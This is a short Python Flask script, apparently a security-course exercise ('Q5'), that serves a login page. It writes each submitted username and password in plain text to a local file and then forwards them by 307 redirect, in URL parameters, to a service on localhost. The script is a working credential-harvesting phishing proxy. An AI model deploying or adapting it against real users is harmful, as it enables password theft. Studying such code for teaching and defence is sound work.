from flask import Flask, render_template, redirect, request
import urllib.parse


app = Flask(__name__)


@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')


        if username and password:


            params = {
                'username': username,
                'password': password,
                'submit': 'submit'
            }
           
            encoded_params = urllib.parse.urlencode(params)
           
            with open("Q5_Exposed_Info.txt", "a") as f:
                f.write(f"Username: {username}, Password: {password}\n")
           
            redirect_url = f"http://127.0.0.1:8080?{encoded_params}"
            return redirect(redirect_url, code=307)
   
    return render_template('q5.html')


if __name__ == '__main__':
    app.run(debug=True)
